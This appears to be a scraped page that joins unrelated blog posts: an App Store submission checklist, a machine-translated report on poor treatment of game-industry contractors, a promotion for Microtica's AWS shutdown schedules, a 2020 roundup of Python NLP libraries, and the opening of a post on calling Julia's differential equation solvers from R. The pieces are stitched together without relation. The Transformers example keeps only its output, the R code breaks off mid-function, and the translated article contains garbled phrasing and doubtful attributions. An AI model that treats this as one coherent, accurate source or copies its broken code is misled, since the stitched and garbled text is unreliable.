<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-12-1.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-12-1.png" alt="app store submission checklist" width="4662" height="3001" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-12-1.png 4662w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-12-1-300x193.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-12-1-768x494.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-12-1-1024x659.png 1024w" sizes="(max-width: 4662px) 100vw, 4662px"></a><span>As you can see, the app’s name also changed 🙂</span></p>
<p>Another point that the App Store team pays attention to while checking subscription-based: list of available plans is to be displayed on one screen. It’s useful not only for user experience but for testers from the Apple who <del>will surely find it hard to tap the button to see more options</del> are people too: they also suffer from a lack of sleep, heartburn, and get into a bad mood. So do them a favor: do not make anyone fiddle around with 25 different screens to study all available plans.</p>
<p>Don’t forget about the ‘Subscription Management’ button — it allows the user to cancel a formerly chosen subscription or change it to a more relevant option. What’s crucial to take into account is redirection to iOS global settings.</p>
<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-4png.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-4png.png" alt="app store submission checklist" width="2041" height="1543" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-4png.png 2041w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-4png-300x227.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-4png-768x581.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-4png-1024x774.png 1024w" sizes="(max-width: 2041px) 100vw, 2041px"></a><span>This is where we check <del>where our money is going</del> active subscriptions</span></p>
<p>It works the following way: the user taps ‘Cancel subscription’, and the app redirects them to the iOS native screen where all subscription services are stored.</p>
<h2>2. Functionality for reporting user-generated content</h2>
<p>The user needs the opportunity to complain about any content that can be created or uploaded: profile pics, photos, videos, text publications (ads, for example). This means that if your app is similar to Instagram or Airbnb, you will have to make sure it has a feature allowing users and administrators to block improper materials from the very first.</p>
<p>We wanted our App Store Submission Checklist to be as clear as possible — a possible question from you might be something like ‘Hey, what is meant by improper materials?’ The answer is the following: any content containing a demonstration of cruelty, social minority discrimination, having a pornographic character, or advertising of illicit drugs.</p>
<p>Any app which includes a chat feature won’t go through without capability to block users:</p>
<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-02.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-02.png" alt="app store submission checklist" width="2667" height="1501" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-02.png 2667w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-02-300x169.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-02-768x432.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-02-1024x576.png 1024w" sizes="(max-width: 2667px) 100vw, 2667px"></a><span>Talentum again</span></p>
<h2>3. Account for a QA engineer</h2>
<p>Every decent App Store Submission Checklist should contain this part. The review team is not interested in spending much time and effort to log in to every app submitted to the App Store. It’s likely that making a super-minimalistic sign-up form still won’t be enough. Let us give you a little advice in this App Store Submission Checklist: take care of the Apple team and just create a testing account for them. It’s as easy as pie.</p>
<p>It’s more or less clear when we’re talking about registration via email. The question is: what to do when the app requires a mobile number? We usually generate a number+code bundle and hand it over to the tester — it allows them to sign in the app without taking the SMS confirmation step.</p>
<h2>4. Screenshots can’t contain alpha channels or transparencies</h2>
<p>No screenshots with transparency is allowed. It means that you have to turn off the alpha channel when saving the PNG.</p>
<h2>5. Terms of Use and Privacy Policy</h2>
<p>It may seem that the Terms of Use and Privacy Policy are formal or useless (and both aren’t worth being a part of this App Store Submission Checklist) but you can be sure that you will need to have both documents at the stage of sending the app to the review.</p>
<p>Although the App Store testers don’t read carefully the Policy and Terms, they always mind these documents. Preparing texts for them won’t be challenging at all — just study the similar pages of three or four competitors, run their content through adequacy, and, if necessary, adapt it to yourself. An alternative option is the generators offered by Google (just search for ‘App Terms of Use generator’ and you’ll see tons of different options).</p>
<p>Where should you place the Policy and Terms of Use? Both should be in the app. In addition, each document is to have a web page.</p>
<h2>6. Explanations for why you access user data and hardware</h2>
<p>In this App Store Submission Checklist, this should definitely be mentioned. Apple won’t let you ask the user to provide your app with access to geolocation if you need it for no good reason. They expect you to give a clear answer to the question ‘What do you do and why do you do this?’. And the answer to the second part should represent the obvious benefits for the user. Regardless of what you need: access to the user’s photos or contacts, camera, microphone, or geolocation.</p>

<h2>7. Native payment service for subscription-based apps</h2>
<p>Neither Stripe nor PayPal can be integrated into apps that offer non-material benefits (access to premium features, perks for gamers, or exclusive content). You’ll have to adopt Apple In-App Purchases which is the native payment system. This rule doesn’t apply to mobile online stores with real goods (pictures, sneakers, beauty products).</p>
<p>P.S. to enable auto-renewable subscriptions, you have to get permission from the App Store. Authorization for auto-renewal is issued only after submitting the necessary legal information about the business. For the Apple team, this is a necessary condition to weed out scammers.</p>
<h2>8. Product specificity</h2>
<p>This point of this App Store Submission Checklist definitely deserves your attention. If the app is related to sports bets, religion, or falls into the category ‘For kids’, be ready to undergo long negotiations with the Apple team. This may require several additional iterations. Just because the niche requires it.</p>

<h2>What else can you examine and put to work?</h2>
<p>Is there anything else to include in this App Store Submission Checklist? Let’s look through the steps.</p>
<p>Start by exploring the App Store Review <a href="https://developer.apple.com/app-store/review/guidelines/">guidelines</a>. You probably won’t have to make much effort. Everything is stated in plain and simple words and has exhaustive explanations. Sit down and study the document with your team — the more people read it, the less risk that you will miss something.</p>
<p>Once you’re done with the guidelines, study the <a href="https://developer.apple.com/app-store/review/#common-app-rejections">most common App Store rejection reasons</a>. Then open Google and look through articles on similar topics. Check the popular mistakes from the get-go to not become this ‘one more person who lost this battle’.</p>
<p>It’s also important to provide the App Store with all the information they are interested in. ‘The more, the better’ rule works perfectly here. Make sure testers won’t tear their hair out over not understanding what they’re working with and how the hell should they test your thing.</p>
<p>Below we’re explaining how to test in-app purchases for a <a href="https://www.purrweb.com/portfolio/#the-sleep-school">sleep app</a>:</p>
<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-7-png.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-7-png.png" alt="app store submission checklist" width="2667" height="1501" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-7-png.png 2667w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-7-png-300x169.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-7-png-768x432.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/VC-screens-7-png-1024x576.png 1024w" sizes="(max-width: 2667px) 100vw, 2667px"></a><span>The filled-in Review Information section minimizes the risk of an unsuccessful review</span></p>
<p>Finally — no matter how thorough the pre-release preparation is, App Store reviewers are just people who may interpret the rules in their own way. Luck or justice – whatever you want to call it – may not always be on your side. You may get approved on the second, third, or even fourth try — it is absolutely normal. Note the details that testers ask about, be persistent, open, and willing to help. And there will be an app release for you!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					
					
					
<p>Amid the announcement of Call of Duty: Black Ops Cold War, Bloomberg raised the issue of working conditions for contractors in the gaming industry. Journalist Jason Schreier partially touched on his back in 2019 while at Kotaku, and now he devoted a <a href="https://www.bloomberg.com/news/articles/2020-08-27/video-game-contractors-receive-poor-treatment-and-low-salary-as-business-booms?srnd=premium">separate article</a>.</p>




<p>Most of the article is devoted to the situation in Activision studios dealing with the new Call of Duty. Before Christmas 2018, Schreier writes, there was a significant situation that reflects the attitude of the publisher towards contractors.</p>



<p>At that time, studio staff received an invitation to the company’s annual holiday event, but some of them were told after a while that they were invited by mistake – in fact, they are not called, because they are not full-time employees, but contractors from Volt Workforce Solutions.</p>



<p>According to Schreier, this attitude is not uncommon in the gaming industry. While company executives receive millions of dollars and top in-house developers can expect substantial bonuses after release, others see nothing but the minimum wage.</p>



<p>Often, contractors’ badges are color-coded, they don’t get paid vacations, their names are sometimes not credited, and when gifts like expensive statues of characters from the game are sent to their staff members, these employees seem to be forgotten. One of the contractors in a conversation with Bloomberg noted that even their work chairs were worse.</p>



<p>Contractors are often told they will have a chance to prove themselves and perhaps even get a position on the state, according to Emma Kinema, who is trying to unite industry developers into unions. Most of the time, however, they get stuck in temporary roles with poor conditions, no bonuses, low salaries, and minimal chances of growth.</p>



<blockquote><p>Contractors should not be used as a way to avoid staff costs.</p><p><br> Emma Kinema<br> Public Relations Specialists of America</p></blockquote>



<p>As Schreier notes, citing data from the ESA, the gaming industry employs about 220,000 full-time employees. They are assisted by thousands of freelance screenwriters and art painters, and in between are contractors who often work as long as full-time employees.</p>



<p>Based on conversations Bloomberg has with over a dozen contractors, these workers often represent an integral part of the team, rather than support. Their contracts have a clear end date for their work, and their contracts are extended so that they do not lose their position, but they are not offered positions in the state, despite all their contribution to the project.</p>



<p>In a conversation with Bloomberg, several former and current employees at Volt Workforce Solutions, which works with Treyarch, said they were being paid less than $ 20 an hour, which required them to work even at night or on weekends to make ends meet.</p>



<p>At the same time, the Volt contract implies that contractors do not have the right to receive bonuses and benefits that are provided for the employees of the studio with which they work. This includes insurance.</p>



<p>The very Activision says that it handles complaints about unfair treatment of employees. The company noted that out of all 10,000 Activision employees, less than 10% are contractors.</p>



<p>According to Bloomberg, freelancers were invited to at least the annual event at the end of 2019, but the problem of poor working conditions, including low salaries, remains relevant.</p>



<p>Some companies in the industry have previously taken steps to reduce the role of contractors in development, but this has led to its own problems. Back in 2014, Microsoft introduced a rule that freelancers can only work under contract for 18 months.</p>



<p>Then Microsoft explained this with a desire to protect their IP and classified information. However, given the timing of game development, this led to the fact that many projects began to lose employees even before the end of the process.</p>



<p>In particular, this affected Halo Infinite, which has been engaged in 343 Industries and freelance studios for more than four years. At one point, the game lost some of the developers due to the expiration of their 18-month contract, and they can be hired back according to the rules only after 6 months.</p>



<p>Microsoft had problems with contractors back in the early 2000s when a class-action lawsuit was filed against the company for lack of bonuses, but this situation did not set a precedent for the industry.</p>



<p>Some regions have their own problems. For example, in Japan, agencies deliberately do not include the names of contractors in the credits so that other companies cannot lure them. According to the anonymous freelancer, he was even forced to use different pseudonyms in the credits.</p>



<p>Either way, the structure of the gaming industry complicates the situation. It does not allow getting rid of temporary positions, but some companies are taking such a step, for example, the indie studio Stray Bombay. According to the head of Chet Falishek, he refused the services of agencies, although he understood that they would help save both time and money.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div>
<p>We often think of the cloud as the perfect solution for saving on infrastructure costs, especially with the<em> pay-as-you-use</em> models. However, moving the same on-premise infrastructure onto the cloud can even end up costing you more, if you don’t do it properly. </p>



<p>AWS is the most innovative leader in the Cloud market. As a product fully-based on AWS at the moment, we tend to reduce cloud complexity for our users in every aspect. One of them is also the optimization of AWS costs.&nbsp;</p>



<p>AWS offers tools that you can use to visualize your costs and usage like the Cost Explorer and Budgets. You can also follow the Cost Optimization advice and recommendations to modify your instances and save money.&nbsp;</p>



<p><em>Here’s what you can do to minimize your costs on AWS:</em></p>



<ul><li>Apply for AWS credits</li><li>Use Spot instances</li><li>Implement Auto-scaling for idle resources</li><li>Use the right AWS region</li><li>Rightsizing your needed compute resources</li></ul>



<p>These action points can help you reduce costs, but they don’t always bring the best results. There’s also one more major thing about your non-production environments you can do to make sure you <strong>maximize your savings</strong>. <strong><a href="https://microtica.com/aws-cost/" target="_blank" rel="noreferrer noopener">Turning them off when your team is not using them.</a>&nbsp;</strong></p>



<p>Companies that are responsible with their finances for a project usually make one big mistake. They have only one cloud environment. </p>



<p>In this case, the process of developing the product is greatly affected. You need your development, testing and production environments to function properly. This is why we believe that <strong><a rel="noreferrer noopener" href="https://microtica.com/aws-cost/" target="_blank">saving on non-production environments</a></strong> when you’re not using them allows you to have <strong>2 or 3 environments active in working hours</strong>.</p>



<h2><a rel="noreferrer noopener" href="https://microtica.com/aws-cost/" target="_blank">Save 60% off Your AWS Costs</a></h2>



<p>Since we are a startup, we need to keep our finances in order. That’s why we constantly work on reducing unnecessary costs. Microtica uses a great number of servers (EC2 instances) and RDS instances running to power our development, testing and production environments.&nbsp;</p>



<p>In order to optimize our resources, we decided to shut down non-production environments when they are not in use. As we are in love with automation, we started working on a solution to automatically turn off instances, with alarm-based jobs. After testing it out and receiving significant results for Microtica, we decided to offer this to our users too.&nbsp;</p>



<p><strong>By shutting down the non-production servers outside of work hours, <a href="https://microtica.com/aws-cost/" target="_blank" rel="noreferrer noopener">we managed to save 60% of our AWS monthly bill.</a>&nbsp;&nbsp;</strong></p>



<p><em>So, how can you take advantage of this feature? </em></p>



<p><a rel="noreferrer noopener" href="https://portal.microtica.com/login" target="_blank">Login</a> to the portal and in the sidebar you will now notice the <strong>Cloud Tools</strong> section. Here you can see 2 new pages: <a rel="noreferrer noopener" href="https://portal.microtica.com/tools/cost-explorer" target="_blank">Cost Explorer</a> and <a rel="noreferrer noopener" href="https://portal.microtica.com/tools/schedules" target="_blank">Saving Schedules</a>.&nbsp;</p>



<p><strong><em>Please note that to use this feature, you just need to have a Microtica account.</em></strong> <em>You have to give the platform access to your AWS account on which you’d like to activate the savings. </em><strong><em>However, your projects don’t have to be based on Microtica and you don’t have to use our platform as your automation tool.&nbsp;</em></strong></p>



<h2>Saving Schedules&nbsp;</h2>



<p>To <a rel="noreferrer noopener" href="https://portal.microtica.com/tools/schedules/create" target="_blank">create a saving schedule</a>, you start with naming the schedule. Then, you select the days you want the schedule to be active. You also choose the timeframe in which the AWS resources should be active (start time and stop time).&nbsp;</p>



<figure><img src="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-17-at-12.16.33-1024x513.png" alt="Sleep schedules for AWS costs" srcset="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-17-at-12.16.33-1024x513.png 1024w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-17-at-12.16.33-300x150.png 300w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-17-at-12.16.33-768x385.png 768w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-17-at-12.16.33-1536x769.png 1536w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-17-at-12.16.33-2048x1026.png 2048w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-17-at-12.16.33-740x371.png 740w" sizes="100vw"><figcaption>Create schedule for environment resources</figcaption></figure>



<p>The next step is to <strong>select an environment</strong> on which you want to implement this schedule. On the right side, you will see all EC2, RDS and auto-scaling groups available in that environment which will be affected by the schedule. </p>



<p>When activating this schedule, it will mark all these resources to be shut-down at the defined <em>Stop Time</em> and to “wake-up” at the defined <em>Start Time</em> on the selected days. You will be able to follow the status of the resources in the list on the right.&nbsp;</p>



<div><figure><img src="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-17-at-12.15.40.png" alt="start schedule for aws costs" width="324" height="436" srcset="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-17-at-12.15.40.png 652w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-17-at-12.15.40-223x300.png 223w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-17-at-12.15.40-297x400.png 297w" sizes="100vw"><figcaption>Create schedule with tag filter</figcaption></figure></div>



<p>Another possible option to create a schedule, if you aren’t using Microtica environments, is to <strong>mark only the resources you want to affect</strong> with a tag. You can add tags to your resources in your AWS console. </p>



<p>Then, in Microtica you enter your AWS account id. You also add tag name and value to automatically shut down all the resources marked with this AWS resource tag. After this, you will be able to see whether they are running or not in the list on the right. </p>



<p>Adding a tag is optional. If you don’t filter by tag, all the resources found in the provided AWS account will be shut down.&nbsp;</p>



<p>After activating the schedule, you will be able to see it in the <strong>list of schedules</strong>. Here you have some basic information around which AWS account this schedule affects and the estimated savings “numbers”.&nbsp;</p>

<h2>Cost Explorer for AWS Costs</h2>



<p>To stay on top of your cloud spendings and have <strong>full visibility</strong> of what is going on with the finances, we’ve created a <a rel="noreferrer noopener" href="https://portal.microtica.com/tools/cost-explorer" target="_blank">Dashboard</a>. Here, you will find some of the most important analytics connected with your AWS accounts:</p>



<ul><li>estimated cost on AWS for the current month</li><li>how the month-to-date spend is behaving</li><li>a breakdown of your cloud spendings in the last year with a forecast for the upcoming year&nbsp;</li><li>which AWS account costs you the most&nbsp;</li><li>which services take the most spendings</li><li>costs by allocation tag&nbsp;</li></ul>



<p>Finally, you can see the accumulated estimated savings for the month. The data is based on the currently active saving schedules and daily utilization hours.</p>

<p>Cloud adoption is on the rise every year because of the cloud computing benefits. Moreover, the impacts on collaboration, security, production, and revenue for companies are obvious. </p>



<p>By implementing steps to <strong><em><a rel="noreferrer noopener" href="https://microtica.com/aws-cost/" target="_blank">effectively manage your cloud savings</a></em></strong> you will experience the long-term financial benefits. This will help your company increase growth, repurpose more resources for market research and development, and ultimately, for marketing activities for your products and services.&nbsp;</p>

    <p><img src="https://kleiber.me/img/python-nlp-2020.png" alt="Top 10 Python Libraries for Natural Language Processing (NLP) in 2020"></p>

<p>In February 2018, I wrote an <a href="https://kleiber.me/blog/2018/02/25/top-10-python-nlp-libraries-2018/">article</a> about ten interesting Python libraries for Natural Language Processing (NLP).</p>

<p>Compared to 2018, the NLP landscape has widened further, and the field has gained even more traction. While not a perfect measurement, the large number of available libraries and packages is a good indicator of how much (openly accessible) material is out there. At the time of writing, looking for “NLP” on <a href="https://pypi.org/search/?q=NLP">PyPI</a> leads to more than 1,560 results. Similarly, <a href="https://libraries.io/search?languages=Python&amp;q=NLP">Libraries.io</a> lists 450 Python packages/libraries for the NLP keyword. Therefore, I thought it is time to have a look at some interesting NLP libraries again. Please note, however, that this is not meant as a replacement for the 2018 article but rather as an update and addition. Therefore, if you have not done so yet, please also look at the original list as I made some more general comments about NLP and NLP libraries.</p>

<p>Since I wrote that first article, fortunately, a lot has changed in the field of NLP, and we have seen a lot of interesting progress. Things are moving fast! The biggest change, at least from my perspective, is the much more widespread adoption of neural networks, deep learning, and particularly Transformer-based models (see, for example, <a href="https://arxiv.org/abs/1810.04805">BERT (late 2018)</a>, <a href="https://d4mucfpksywv.cloudfront.net/better-language-models/language_models_are_unsupervised_multitask_learners.pdf">GPT-2 (2019)</a>, and most recently <a href="https://arxiv.org/abs/2005.14165">GPT-3 (2020)</a>. While ‘traditional’ approaches to NLP and computational linguistics are still going strong, and rightfully so, these new models and methods are moving the field forward and allow us to do new and exciting things. Hence, I tried to reflect this change in the list of Python libraries as well.</p>

<h2 id="top-10-python-libraries">Top 10 Python Libraries</h2>

<blockquote>
  <p><em>Disclaimer</em>: In the following I’m going to use the terms ‘library’, ‘module’, and ‘package’ rather loosely. Please don’t give me a hard time about it. For the sake of this article, a library will be defined as a (collection of) (third party) extension(s) that you can use in your own code that provides some additional functionality.</p>
</blockquote>

<p>As I said before, there is a myriad of tools and libraries to choose from. Hence it is extremely hard to come up with a reasonable “Top 10 List”. The list I am presenting here has been compiled following a few, rather loose, criteria: I wanted to showcase actively developed, widely used, and multipurpose libraries that are useful to as many developers and researchers as possible. I also took the number of GitHub stars (as a proxy for spread and popularity) as well as the date of the last commit into account. Ultimately, however, the list is also influenced by my experience and my view of what is useful. I am certain that there will be readers who would have liked to see a very different set of libraries - that’s perfectly fine and reasonable!</p>

<p>Where it makes sense, I have provided short examples for the libraries. These examples, by no means, demonstrate the full capabilities of these tools. They are merely there for you to get a feeling for how the APIs look and feel like 😊.</p>

<p><em>The Top 10 Python NLP Libraries. The ‘+ X since 2018’ notes refer to the number of stars reported in the <a href="https://kleiber.me/blog/2018/02/25/top-10-python-nlp-libraries-2018">2018 article</a>. “GitHub Stars” and “Last Commit” as of 2020-08-26.</em></p>

<p>As you might have noticed, my 2020 list differs significantly from the 2018 one. Compared to the old list, the following libraries have been removed or replaced: <a href="https://www.uantwerpen.be/en/research-groups/clips/">Pattern</a>, <a href="http://polyglot.readthedocs.io/en/latest/">Polyglot</a>, <a href="https://github.com/tasdikrahman/vocabulary">Vocabulary</a>, <a href="https://pypi.python.org/pypi/PyNLPl">PyNLPl</a>, <a href="https://github.com/stanfordnlp/python-stanford-corenlp">Stanford CoreNLP Python</a>, and <a href="http://alumni.media.mit.edu/~hugo/montylingua/">MontyLingua</a>. These libraries have either been replaced by a newly developed one (e.g., <em>Stanza</em> replacing <em>Stanford CoreNLP Python</em>) or are not actively developed or maintained anymore. The exclusion of these libraries does not mean that they are bad or unusable in any way. However, I simply wanted to highlight actively developed projects as well as libraries that represent current developments in the field.</p>

<p>As you can see, the libraries that stayed on the list, measured in the number of GitHub stars, have all gained in popularity. Especially <em>spaCy</em> (first released in 2015), an absolutely fantastic all-purpose library, has gained a lot of traction. Also, again looking at the stars, we can see the huge interest in Transformers (🤗 Transformers having 32.9k stars).</p>

<p>An important side note: Many of these libraries and associated pre-trained models, despite often being multilingual or even language-agnostic, still have a strong focus on (standard) English. Similarly, a large amount of linguistic and NLP research focuses on English and other “major” languages. It is very important for me to point out that “language” should <em>not</em> be equated with (standard) English (or Spanish, or German, or French, …) and that the marginalization of other languages and varieties is a severe problem. Therefore, I want to point out that there are various research projects (see, for example, <a href="https://www.masakhane.io/">Masakhane</a> for African languages) devoted to other languages that deserve both attention and support.</p>

<h2 id="libraries-in-detail">Libraries in Detail</h2>

<p>This article will only focus on those libraries that I have newly added to the list. For details and examples regarding the other libraries, please just have a look at the <a href="https://kleiber.me/blog/2020/08/26/top-10-python-nlp-libraries-2020/(https://kleiber.me/blog/2018/02/25/top-10-python-nlp-libraries-2018)">previous article</a>.</p>

<h3 id="-transformers">🤗 Transformers</h3>

<p><a href="https://huggingface.co/">Hugging Face</a>, hence the 🤗, has released a number of highly interesting NLP libraries, utilities, and datasets/models. The most widely known one being 🤗 <em>Transformers</em>, providing easy access to many pre-trained models as well as great interfaces to <em>PyTorch</em> and <em>TensorFlow</em>. Contrary to many of the other libraries, 🤗 <em>Transformers</em> is not a “toolkit,” but a very useful and powerful way of working with various language models and embeddings that is particularly optimized for NLU and NLG tasks.</p>

<p>For this brief example, we will be using the <code>pipeline()</code> function to run pre-trained models for various common tasks. Essentially <code>pipeline()</code> automatically retrieves (downloads) the desired model and also handles the preprocessing (especially tokenization) for us. If you are interested in what happens under the hood, definitely look at the <a href="https://huggingface.co/transformers/quicktour.html#under-the-hood-pretrained-models">documentation</a> that nicely outlines all of the steps taken.</p>

<span>&gt;&gt;&gt;</span>
<span>'''
"This model works really very well." got 5 stars and a score of 0.7683704495429993.
"This model is okay." got 3 stars and a score of 0.812630832195282.
"This model really does not work very well!" got 1 star and a score of 0.49196574091911316.
'''</span></code></pre></figure>

<p>In the above example, the <a href="https://huggingface.co/nlptown/bert-base-multilingual-uncased-sentiment">bert-base-multilingual-uncased-sentiment</a> model is used to predict the sentiment of three statements (reviews). This particular model has been finetuned for sentiment analysis on product reviews and returns a score of stars between one and five. As we can see, for the three simple examples, it performed really well and produced the desired results.</p>

<p>While this example demonstrated how easy it is to get started with 🤗 <em>Transformers</em>, the library’s true value lies in its capabilities when it comes to (re)training/finetuning and customizing models for specific use-cases using either <em>PyTorch</em> or <em>TensorFlow</em>. Also, definitely have a look at the large <a href="https://huggingface.co/models">set of available models for various languages and tasks</a> provided by Hugging Face.</p>

<h3 id="flair">flair</h3>

<p><a href="https://github.com/flairNLP/flair"><em>flair</em></a>, developed at the Humbold University of Berlin in collaboration with Zalando Research, provides very easy access to powerful state-of-the-art NLP embeddings and models. While <em>flair</em> is built specifically with the powerful “Flair embeddings” (see “<a href="https://www.aclweb.org/anthology/C18-1139">Contextual String Embeddings for Sequence Labeling</a> for more details) in mind, the library also supports embeddings such as BERT, ELMo, and GloVe.</p>

<p>It comes with a number of embeddings and pre-trained models for various languages and tasks including, for example, Named Entity Recognition, Part-of-Speech Tagging, and Semantic Frame Detection. For each tagging task, <em>flair</em> can use a different model, allowing you to customize your pipeline very well. As we will see below, the library also supports stacking embeddings, which is an exciting …</p></div></div>

                <p><a href="https://www.r-project.org/">R</a> is a widely used language for data science, but due to performance most of its underlying library are written in C, C++, or Fortran. <a href="https://julialang.org/">Julia</a> is a relative newcomer to the field which has busted out since its 1.0 to become <a href="https://spectrum.ieee.org/static/interactive-the-top-programming-languages-2020">one of the top 20 most used languages</a> due to its high performance libraries for scientific computing and machine learning. Julia's value proposition has been its high performance in high level language, known as solving the two language problem, which has allowed allowed the language to build <a href="https://juliahub.com/ui/Home">a robust, mature, and expansive package ecosystem</a>. While this has been a major strength for package developers, the fact remains that there are still large and robust communities in other high level languages like R and Python. Instead of spawning distracting language wars, we should ask the question: can Julia become a language of libraries to accelerate these other languages as well?</p>
<p>This is definitely not the first time this question was asked. The statistics libraries in Julia were developed by individuals like <a href="http://128.105.7.173/~bates/">Douglas Bates who built some of R's most widely used packages like lme4 and Matrix</a>. Doug had <a href="https://rpubs.com/dmbates/377897">written a blog post in 2018 showing how to get top notch performance in linear mixed effects model fitting via JuliaCall</a>. In 2018 the JuliaDiffEq organization had <a href="https://sciml.ai/news/2018/04/30/Jupyter/"> written a blog post demonstrating the use of DifferentialEquations.jl in R and Python (the Jupyter of Diffrential Equations)</a>. Now rebranded as <a href="https://sciml.ai/">SciML</a> for <a href="https://sciml.ai/roadmap/">Scientific Machine Learning</a>, we looked to expand our mission and bring <a href="https://arxiv.org/abs/2001.04385">automated model discovery and acceleration</a> include other languages like R and Python with Julia as the base.</p>
<p>With the release of <a href="https://cran.r-project.org/web/packages/diffeqr/index.html">diffeqr</a> v1.0, we can now demonstrate many advances in R through the connection to Julia. Specifically, I would like to use this blog post to showcase:</p>
<ol>
<li>The new direct wrapping interface of diffeqr</li>
<li>JIT compilation and symbolic analysis of ODEs and SDEs in R using Julia and <a href="https://github.com/SciML/ModelingToolkit.jl">ModelingToolkit.jl</a></li>
<li>GPU-accelerated simulations of ensembles using Julia's <a href="https://github.com/SciML/DiffEqGPU.jl">DiffEqGPU.jl</a></li>
</ol>
<p>Together we will demonstrate how models in R can be accelerated by 1000x without a user ever having to write anything but R.</p>
<h2>A Quick Note Before Continuing</h2>
<p>Before continuing on with showing all of the features, I wanted to ask for support so that we can continue developing these bridged libraries. Specifically, I would like to be able to support developers interested in providing a fully automated Julia installation and static compilation so that calling into Julia libraries is just as easy as any Rcpp library. To show support, the easiest thing to do is to star our libraries. The work of this blog post is build on <a href="https://github.com/SciML/DifferentialEquations.jl">DifferentialEquations.jl</a>, <a href="https://github.com/SciML/diffeqr">diffeqr</a>, <a href="https://github.com/SciML/ModelingToolkit.jl">ModelingToolkit.jl</a>, and <a href="https://github.com/SciML/DiffEqGPU.jl">DiffEqGPU.jl</a>. Thank you for your patience and now back to our regularly scheduled program.</p>
<h2>diffeqr v1.0: Direct wrappers for Differential Equation Solving in R</h2>
<p>First let me start with the new direct wrappers of differential equations solvers in R. In the previous iterations of diffeqr, we had relied on specifically designed high level functions, like "ode_solve", to compensate for the fact that one could not directly use Julia's original DifferentialEquations.jl interface directly from R. However, the new diffeqr v1.0 directly exposes the entirety of the Julia library in an easy to use framework.</p>
<p>To demonstrate this, let's see how to define the Lorenz ODE with diffeqr. In Julia's DifferentialEquations.jl, we would start by defining an "ODEProblem" that contains the initial condition u0, the time span, the parameters, and the f in terms of `u' = f(u,p,t)` that defines the derivative. In Julia, this would look like:</p>


<div><div><div><div><div><div><div><pre><span>using</span> DifferentialEquations
<span>function</span> lorenz<span>(</span>du,u,p,t<span>)</span>
  du<span>[</span><span>1</span><span>]</span> = p<span>[</span><span>1</span><span>]</span><span>*</span><span>(</span>u<span>[</span><span>2</span><span>]</span>-u<span>[</span><span>1</span><span>]</span><span>)</span>
  du<span>[</span><span>2</span><span>]</span> = u<span>[</span><span>1</span><span>]</span><span>*</span><span>(</span>p<span>[</span><span>2</span><span>]</span>-u<span>[</span><span>3</span><span>]</span><span>)</span> - u<span>[</span><span>2</span><span>]</span>
  du<span>[</span><span>3</span><span>]</span> = u<span>[</span><span>1</span><span>]</span><span>*</span>u<span>[</span><span>2</span><span>]</span> - p<span>[</span><span>3</span><span>]</span><span>*</span>u<span>[</span><span>3</span><span>]</span>
<span>end</span>
u0 = <span>[</span><span>1.0</span>,<span>1.0</span>,<span>1.0</span><span>]</span>
tspan = <span>(</span><span>0.0</span>,<span>100.0</span><span>)</span>
p = <span>[</span><span>10.0</span>,<span>28.0</span>,<span>8</span>/<span>3</span><span>]</span>
prob = ODEProblem<span>(</span>lorenz,u0,tspan,p<span>)</span>
sol = solve<span>(</span>prob,saveat=<span>1.0</span><span>)</span></pre></div></div></div></div></div></div></div>


<p>With the new diffeqr, diffeq_setup() is a function that does a few things:</p>
<ol>
<li>It instantiates a Julia process to utilize as its underlying compute engine</li>
<li>It first checks if the correct Julia libraries are installed and, if not, it installs them for you</li>
<li>Then it exposes all of the functions of DifferentialEquations.jl into its object</li>
</ol>
<p>What this means is that the following is the complete diffeqr v1.0 code for solving the Lorenz equation is:</p>


<div><div><div><div><div><div><div><pre>library(diffeqr)
de &lt;- diffeqr::diffeq_setup()
f &lt;- function(u,p,t) {
